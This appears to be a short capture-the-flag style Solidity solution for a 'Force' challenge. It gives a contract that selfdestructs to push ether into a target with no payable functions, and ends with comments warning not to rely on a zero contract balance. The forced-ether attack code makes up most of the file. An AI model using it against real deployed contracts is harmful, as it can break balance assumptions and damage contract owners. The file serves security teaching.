// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./8_Force.sol";

contract Force_Attack {
    Force force;

    constructor(address _force) {
        force = Force(_force);
    }

    function changeResult() public {
        selfdestruct(payable(address(force)));
    }

    receive() external payable {}

    fallback() external payable {}
}

// After:

// In solidity, for a contract to be able to receive ether, the fallback function must be marked payable.

// However, there is no way to stop an attacker from sending ether to a contract by self destroying. Hence, it is important not to count on the invariant address(this).balance == 0 for any contract logic.
